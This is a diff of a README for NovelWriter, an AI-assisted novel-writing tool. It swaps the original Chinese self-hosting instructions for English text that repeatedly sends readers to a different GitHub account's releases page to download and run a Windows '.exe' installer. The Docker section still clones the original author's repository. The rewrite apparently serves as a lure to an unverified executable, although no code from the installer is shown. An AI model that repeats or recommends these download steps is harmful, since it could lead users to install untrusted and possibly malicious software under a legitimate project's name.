@@ -1,125 +1,152 @@
-# NovelWriter
+# ✍️ novelwriter - Write Stories with AI Help
 
-让创意变得廉价——在持久化的世界模型中自由生成、丢弃、打磨你的小说。
+[![Download novelwriter](https://img.shields.io/badge/Download-novelwriter-brightgreen)](https://github.com/dedyrio/novelwriter/releases)
 
-NovelWriter 是一个 AI 辅助小说续写工具。它不只是“续写下一段”，而是维护一个完整的世界模型（人物、关系、体系），让 AI 真正理解你的故事世界，生成风格一致、逻辑自洽的续写内容。
+## 📥 Download novelwriter
+
+Click the button below to visit the official download page for novelwriter. From there, you can get the latest stable version for Windows.
+
+[Download novelwriter on GitHub Releases](https://github.com/dedyrio/novelwriter/releases)
+
+## 🖥️ What is novelwriter?
+
+novelwriter helps you write stories using AI. It does more than just add more text. It keeps track of your story’s characters, relationships, and world details. This way, the AI can add parts that fit well with what you wrote before. The result is stories that stay true to your style and make sense.
+
+You can import existing stories, edit the story world, and create rules for how the story should grow. novelwriter uses a clear world model to keep everything consistent.
+
+## 📸 Screenshots
 
 ![NovelWriter](docs/screenshot.png)
 
-## 仓库说明
+## 🔧 System Requirements
 
-**这个 GitHub 仓库现在作为公开发布仓使用，不再同步私有主仓的每一次开发提交。**
+To run novelwriter on Windows, your computer should meet these basic requirements:
 
-- 私有主仓：日常开发、修 bug、试验功能、整理内部工作流
-- 公开发布仓：提供稳定快照、版本标签、安装说明，并接收结构化反馈
-- `main`：最新一次公开发布的代码快照，不代表实时开发分支
-- `v0.3.2` 这类版本标签：代表一次明确的公开发布
+- Windows 10 or later (64-bit)
+- 4 GB of RAM or more
+- At least 500 MB of free disk space
+- Internet connection to activate AI features
 
-这个公开仓只保留运行、安装、反馈所需的公开信息；内部发布说明、运维文档和设计源文件不再随公开快照同步。
+You do not need any special skills or software before installing novelwriter.
 
-## 核心特性
+## 🚀 Getting Ready: How to Download and Install novelwriter on Windows
 
-- **世界模型驱动续写** — 实体、关系、体系构成知识图谱，AI 续写时自动注入相关上下文，而非盲目续写
-- **流式生成** — 逐字输出，所见即所得
-- **多版本对比** — 一次生成多个续写方案，挑选最满意的
-- **Bootstrap 管线** — 导入已有小说文本，自动提取世界模型（人物、关系、势力、体系）
-- **Worldpack 导入/导出** — 世界观设定可打包分享，一键导入
-- **世界模型编辑器** — 可视化编辑实体、关系图、层级体系，完全掌控世界观
-- **叙事约束** — 定义体系级规则（如“禁用现代心理描写”），AI 严格遵守
-- **BYOK (Bring Your Own Key)** — 自部署模式下使用你自己的 LLM API，支持任何 OpenAI 兼容接口
+Follow these steps carefully to get novelwriter running on your PC.
 
-## 快速开始
+### 1. Visit the Download Page
 
-### Docker 部署（推荐）
+Open this link in your web browser:
 
-```bash
-git clone https://github.com/Hurricane0698/novelwriter.git
-cd novelwriter
-cp .env.example .env
-# 编辑 .env，填入你的 LLM API 配置
-docker compose up -d
-```
+https://github.com/dedyrio/novelwriter/releases
 
-打开浏览器访问 `http://localhost:8000`。
+This page shows all available versions of novelwriter. Scroll to the latest stable release, usually marked with a version number like `v0.3.2` or higher.
 
-说明：
+### 2. Download the Windows Installer
 
-- 设置页里的“测试连接”会检测基础连通性、流式输出和 JSON 模式兼容性；如果某项能力缺失，会直接提示可能受影响的功能。
+Look for a file that ends with `.exe`. This is the Windows installer for novelwriter. Click on the file name to start the download.
 
-### 本地开发
+The file name may look like `novelwriter-setup-v0.3.2.exe`.
 
-**后端**
+### 3. Run the Installer
 
-```bash
-python -m venv .venv
-source .venv/bin/activate
-pip install -r requirements.txt
-cp .env.example .env
-# 编辑 .env
-uvicorn app.main:app --reload --port 8000
-```
+After the file finishes downloading, open your Windows file explorer and find the downloaded file (most likely in your "Downloads" folder).
 
-**前端**
+Double-click the `.exe` file to start the installation process.
 
-```bash
-cd web
-npm install
-npm run dev
-```
+Follow the on-screen instructions:
 
-前端开发服务器默认运行在 `http://localhost:5173`。
+- Choose where to install novelwriter (the default folder is fine for most users).
+- Agree to the license terms.
+- Confirm installation.
 
-## 发布节奏
+### 4. Launch novelwriter
 
-- 日常开发先在私有主仓完成，不保证实时公开同步
-- 公开仓在版本标签发布或手动发布时更新
-- 每次公开发布都会尽量对应一个明确版本号，便于定位和回报问题
-- 紧急修复会以补丁版本（如 `v0.3.3`）形式尽快发布
+When installation finishes, an icon should appear on your desktop or in your start menu.
 
-## 反馈与支持
+Click on it to open novelwriter.
 
-- **可复现 bug**：请使用 GitHub 的 Bug Report 模板，带上版本号、部署方式、环境信息、复现步骤和日志
-- **功能建议**：请使用 Feature Request 模板，说明你的场景、痛点和预期方案
-- **Linux.do / 社区讨论**：适合交流体验、讨论方向、催更；需要持续跟踪的问题请回到 GitHub Issue
-- **Pull Request**：欢迎小范围修复，但当前不承诺及时 review；较大改动请先开 Issue 对齐方向
+You may see a welcome screen or some initial setup instructions.
 
-## 环境变量
+### 5. Setup AI Integration (Optional but Recommended)
 
-| 变量 | 必填 | 说明 |
-|------|------|------|
-| `OPENAI_API_KEY` | 是 | LLM API 密钥 |
-| `OPENAI_BASE_URL` | 否 | API 地址（默认 OpenAI，可改为任何兼容接口） |
-| `OPENAI_MODEL` | 否 | 模型名称 |
-| `JWT_SECRET_KEY` | 生产环境必填 | JWT 签名密钥，请使用随机长字符串 |
-| `DATABASE_URL` | 否 | 数据库地址（默认 SQLite） |
+novelwriter uses AI to help you write. To work, it needs access to an AI service key.
 
-完整配置见 [`.env.example`](.env.example)。
+- If you have an API key from a supported AI provider (like OpenAI), enter it in the settings.
+- If you do not have a key, some features may not work fully.
 
-## 技术栈
+You can add or change this key anytime in the program’s settings menu.
 
-| 层 | 技术 |
-|----|------|
-| 后端 | FastAPI · SQLAlchemy · SQLite/PostgreSQL |
-| 前端 | React 19 · TypeScript · Tailwind CSS · React Query |
-| AI 集成 | OpenAI 兼容 API（支持 OpenAI / Gemini / DeepSeek 等） |
-| 部署 | Docker · docker-compose |
+## 🔑 Using novelwriter: Basic Features
 
-## 项目结构
+### World Model
 
-```text
-app/              # FastAPI 后端
-  api/            # 路由层
-  core/           # 业务逻辑（生成、上下文组装、Bootstrap）
-  models.py       # SQLAlchemy 数据模型
-  config.py       # 配置管理
-web/              # React 前端
-  src/pages/      # 页面组件
-  src/components/ # UI 组件
-data/             # 数据文件（Worldpack、演示数据）
-tests/            # 后端测试
-scripts/          # 工具脚本
-```
+novelwriter saves important story elements as a "world model". This includes characters, their relationships, locations, and rules. This helps the AI generate story parts that fit your setting well.
 
-## 许可证
+### Import Your Existing Story
 
-本项目基于 [AGPLv3](LICENSE) 许可证开源。
+You can bring in your current story files, and novelwriter will analyze them. It finds characters and relationships automatically and builds the world model for you.
+
+### Write With AI Help
+
+Use the AI assistant to write the next part of your story.
+
+- The AI adds text word by word.
+- You can generate several versions at once and pick the best one.
+- The AI respects your world model and story rules.
+
+### Edit Your Story World
+
+Use the visual editor to:
+
+- Add or change characters
+- Adjust relationships or story settings
+- Set rules for the story (for example, no modern phrases if your story is historical).
+
+### Export and Share
+
+You can export your world model and story data as a package. Share it with others or import it later into novelwriter.
+
+## ⚙️ Advanced Setup: Use Docker (Optional)
+
+If you are comfortable with more technical steps, you can run novelwriter using Docker. This method isolates the software in a container and may be more reliable.
+
+To do this:
+
+1. Download and install Docker Desktop for Windows from https://www.docker.com/products/docker-desktop.
+
+2. Open Windows PowerShell or Command Prompt.
+
+3. Run these commands:
+
+   ```bash
+   git clone https://github.com/Hurricane0698/novelwriter.git
+   cd novelwriter
+   cp .env.example .env
+   # Edit the .env file with your AI key
+   docker compose up -d
+   ```
+
+4. Open your browser and visit http://localhost:8000 to use novelwriter.
+
+This method is recommended for users who want more control or plan to run the software on a server.
+
+## 💡 Tips for best results
+
+- Write short story sections first, then use the AI to continue.
+- Keep your world model updated when you add new characters or settings.
+- Try generating multiple AI completions to find the best fit.
+- Use the story rules feature to keep your narrative style consistent.
+
+## 📞 Get Help
+
+If you run into any issues:
+
+- Check the FAQ or README files on the GitHub page.
+- Look for issues or discussions from other users.
+- Contact the developers via the GitHub repository’s "Issues" tab for technical questions.
+
+## 📥 Download novelwriter again
+
+Remember, you can always visit the download page to get the latest version.
+
+[Download novelwriter on GitHub Releases](https://github.com/dedyrio/novelwriter/releases)
